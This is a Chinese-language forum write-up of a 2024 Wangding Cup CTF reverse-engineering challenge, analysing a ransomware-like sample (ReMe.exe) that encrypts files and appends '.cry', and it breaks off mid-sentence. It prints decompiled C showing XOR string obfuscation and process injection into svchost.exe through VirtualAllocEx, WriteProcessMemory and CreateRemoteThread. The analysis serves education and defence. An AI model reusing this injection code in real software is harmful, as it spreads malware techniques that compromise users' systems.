---
title: 【病毒分析】2024年网鼎杯朱雀组REVERSE02——关于勒索木马解密详解
url: https://forum.butian.net/share/3981
source: 奇安信攻防社区
date: 2024-12-13
fetch_date: 2025-10-06T19:33:19.110996
---

# 【病毒分析】2024年网鼎杯朱雀组REVERSE02——关于勒索木马解密详解

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 【病毒分析】2024年网鼎杯朱雀组REVERSE02——关于勒索木马解密详解

* [CTF](https://forum.butian.net/topic/52)

1.背景
1.1 网鼎杯比赛介绍
为深入贯彻落实习近平总书记关于网络强国的重要思想，全面践行总体国家安全观，充分调动社会力量积极性，挖掘和选拔网络安全实战化人才，进一步筑牢网络安全防线，在...

\*\*1.背景\*\*
========
1.1 网鼎杯比赛介绍
-----------
为深入贯彻落实习近平总书记关于网络强国的重要思想，全面践行总体国家安全观，充分调动社会力量积极性，挖掘和选拔网络安全实战化人才，进一步筑牢网络安全防线，在前三届“网鼎杯”网络安全大赛基础上，第四届“网鼎杯”网络安全大赛以“网数融合，鼎筑未来”为主题，打造最大规模、最新技术、最高水平的“网络安全奥运会”。
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-c7a5617696341200c90aa1bd815a9658466d1720.png)
网站链接：<https://www.wangdingcup.com/>\#/
1.2 朱雀组介绍
---------
（能源、电力、化工、国防及其他行业单位）
1.3 题目介绍 RE02
-------------
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-b519a9cb8416d14f975253b4dede2d995e36e3d0.jpeg)
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-fb98181e74310334e8d91b79f6845f1f823adbcc.png)
2.恶意文件基础信息
==========
2.1 加密器基本信息
-----------
| | |
|---|---|
| 文件名: | ReMe.exe |
| 编译器: | Microsoft Visual C/C++(16.00.30319)\[LTCG/C++\] |
| 大小: | 499.00KB |
| 操作系统: | Windows(XP)\[I386, 32位, Console\] |
| 架构: | 386 |
| 模式: | 32 位 |
| 类型: | EXEC |
| 字节序: | LE |
| MD5: | 4fd22bc6938254c2ba65fcc38f23d603 |
| SHA1: | b388453c3a4aa0d3142ecebf4eb9637e6b9d559c |
| SHA256: | c2964f90a0d4ef70e0092aed526c482d9ab157ee3f59a40955f3e1087fbeee07 |
3.加密后文件分析
=========
3.2 加密的测试文件
-----------
### 3.2.1文件名
flag.txt
### 3.2.2具体内容
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-f1d8e7b2a369231a3dbcd3c7f6d3e308adc83038.png)
### 3.2.3加密文件名特征
加密文件名 = 原始文件名+.cry ，例如：flag.txt.cry
### 3.2.4加密算法
文件加密使用了AES-ECB加密算法。
#### 3.2.4.1AES密钥生成
key内置于文件中
### 3.2.5程序执行流程
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-8dd2e1747da870515a65c30ac6252da3c061bfcf.png)
4逆向分析
=====
4.1加密器逆向分析
----------
拖入die，发现是一个vmp保护的程序
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-daa1b9006772cf8dac3eda66d4c9532a3e5faa88.png)
### 4.1.1 简单脱壳
拖入ida中，发现了一个跟堆栈保护相关的函数，通过他我们可以跟踪到入口点
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-50efb2b5eecc7523c27c99b4bc874bfa7948b640.png)
通过交叉引用最后能找到，猜测此处为入口点
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-d1143c0cdde45e8bd314a6324158c13b6ba0e6fe.png)
此处为跳转的入口点的地方
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-33aa8fefa0e5ee8b3df4e6426fb8ce800853f8b5.png)
拖入xdbg，并在此处下硬件断点
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-d09c9f116985c67d6c58d91def70c2ff08a275f9.png)
断住之后使用sycall插件修复iat并转储文件
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-57677333970b23728ed9c379f21b1b5a9d1e18ef.png)
将其拖入ida中，最后出现了三个函数
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-b1fccba1946ca96d267abafa5f19dc82fd709fc4.png)
### 4.1.2 进程注入初次加密
第一个函数如下，首先自解密出字符串
```C
memset(Buffer, 0, sizeof(Buffer));
for ( i = 0; i < strlen(LibFileName); ++i )
LibFileName[i] ^= 1u;
LibraryA = LoadLibraryA(LibFileName);
for ( j = 0; j < strlen(aBsdUdghmd); ++j )
aBsdUdghmd[j] ^= 1u;
Buffer[0] = (int)GetProcAddress(LibraryA, aBsdUdghmd);
for ( k = 0; k < strlen(aSdEghmd); ++k )
aSdEghmd[k] ^= 1u;
Buffer[1] = (int)GetProcAddress(LibraryA, aSdEghmd);
for ( m = 0; m < strlen(aVshudghmd); ++m )
aVshudghmd[m] ^= 1u;
Buffer[2] = (int)GetProcAddress(LibraryA, aVshudghmd);
for ( n = 0; n < strlen(aBmnrdiOemd); ++n )
aBmnrdiOemd[n] ^= 1u;
Buffer[3] = (int)GetProcAddress(LibraryA, aBmnrdiOemd);
for ( ii = 0; ii < strlen(aEdmdudghmd); ++ii )
aEdmdudghmd[ii] ^= 1u;
Buffer[4] = (int)GetProcAddress(LibraryA, aEdmdudghmd);
for ( jj = 0; jj < strlen(String2); ++jj )
String2[jj] ^= 1u;
lstrcpyA((LPSTR)&Buffer[5], String2);
memset(pszPath, 0, sizeof(pszPath));
```
得到如下字符串
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-cd24c2cdfa263f576db743d852679cb48182adea.png)
检测当前进程是否运行在wow模式，并尝试获取系统文件夹路径
```C
Wow64Process = 0;
CurrentProcess = GetCurrentProcess();
IsWow64Process(CurrentProcess, &Wow64Process);
SHGetFolderPathA(0, 4 \* Wow64Process + 37, 0, 0, pszPath);
```
得到如下字符串
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-c2a55af3c2bd153170c020bb3c572fcbd84d5195.png)
自解密后拼接生成字符串C:\\\\Windows\\\\SysWOW64\\\\svchost.exe
```C
for ( kk = 0; kk < strlen(aRwbinruDyd); ++kk )
aRwbinruDyd[kk] ^= 1u;
lstrcatA(pszPath, aRwbinruDyd);
```
创建进程svchost.exe并进行注入
```C
if ( CreateProcessA(0, pszPath, 0, 0, 0, 4u, 0, 0, v11, v13) )
{
v14 = (char \*)VirtualAllocEx(v13->hProcess, 0, 0x2000u, 0x3000u, 0x40u);
if ( v14
&& (!WriteProcessMemory(v13->hProcess, v14, Buffer, 0x34u, &NumberOfBytesWritten)
|| !WriteProcessMemory(
v13->hProcess,
v14 + 52,
sub\_6E14E0,
(char \*)sub\_6E15F0 - (char \*)sub\_6E14E0,
&NumberOfBytesWritten)) )
{
GetLastError();
return VirtualFree(v14, 0x2000u, 0x4000u);
}
}
else
{
v14 = (char \*)NumberOfBytesWritten;
}
RemoteThread = CreateRemoteThread(v13->hProcess, 0, 0, (LPTHREAD\_START\_ROUTINE)(v14 + 52), v14, 0, 0);
return WaitForSingleObject(RemoteThread, 0xFFFFFFFF);
}
```
对v13-&gt;hProcess 指向的进程进行附加，并跳转到WriteProcessMemory注入内存的位置
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-f50eb2666efb35e4cf269cc6dd91f9bddb5874e8.png)
得到一个字符串
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-9a52a9a2b835449502e438db33dc43d3160fb322.png)
对文件进行读取，同时对文件内容进行异或0x9
```C
int \_\_stdcall sub\_B30034(int a1)
{
int (\_\_stdcall \*CreateFileA)(int, int, int, \_DWORD, int, int, \_DWORD); // eax
int v2; // ebx
int v3; // edi
unsigned int v5; // ecx
int v6; // edi
int v7; // eax
int v8; // [esp-4h] [ebp-3Ch]
char v9[36]; // [esp+Ch] [ebp-2Ch] BYREF
int v10; // [esp+30h] [ebp-8h]
int v11; // [esp+34h] [ebp-4h] BYREF
memset(v9, 0, sizeof(v9));
CreateFileA = \*(int (\_\_stdcall \*\*)(int, int, int, \_DWORD, int, int, \_DWORD))a1;
v2 = a1 + 20;
v11 = 0;
v3 = CreateFileA(a1 + 20, -1073741824, 1, 0, 3, 128, 0);
v10 = v3;
if ( v3 != -1 )
{
if ( !(\*(int (\_\_stdcall \*\*)(int, char \*, int, int \*, \_DWORD))(a1 + 4))(v3, v9, 32, &v11, 0) )
{
v8 = v3;
LABEL\_4:
(\*(void (\_\_stdcall \*\*)(int))(a1 + 12))(v8);
return 0;
}
v5 = 0;
if ( &v9[strlen(v9) + 1] != &v9[1] )
{
do
v9[v5++] ^= 9u;
while ( v5 < strlen(v9) );
v3 = v10;
}
(\*(void (\_\_stdcall \*\*)(int))(a1 + 12))(v3);
(\*(void (\_\_stdcall \*\*)(int))(a1 + 16))(v2);
v6 = (\*(int (\_\_stdcall \*\*)(int, int, int, \_DWORD, int, int, \_DWORD))a1)(v2, -1073741824, 1, 0, 2, 128, 0);
v7 = (\*(int (\_\_stdcall \*\*)(int, char \*, unsigned int, int \*, \_DWORD))(a1 + 8))(v6, v9, strlen(v9), &v11, 0);
v8 = v6;
if ( !v7 )
goto LABEL\_4;
(\*(void (\_\_stdcall \*\*)(int))(a1 + 12))(v6);
}
return 0;
}
```
### 4.1.3 释放pe文件
由于转储没修复好，因此无法读取到资源
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-3aebb50c97a1c102152e02f3ac347e05f22e943e.png)
因此将Reme.exe拖入xdbg中分析，对sizeofresource下硬件执行断点
读取资源
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-282d3bf00af1d378b9bbe359cae2569f7565a3eb.png)
该资源大小为b800
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-14c995eb1cbdeae11ce8f1892895e573887b8491.png)
对提取出的资源进行异或解密
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-730f56e853905891088ed6cbab7da274eab87992.png)
解密出一个pe文件
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-564f144876e6e9a83281de5d1f054e08f6bc9582.png)
创建进程，其中ebx所在的地址的第三个值即使进程的pid
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/att...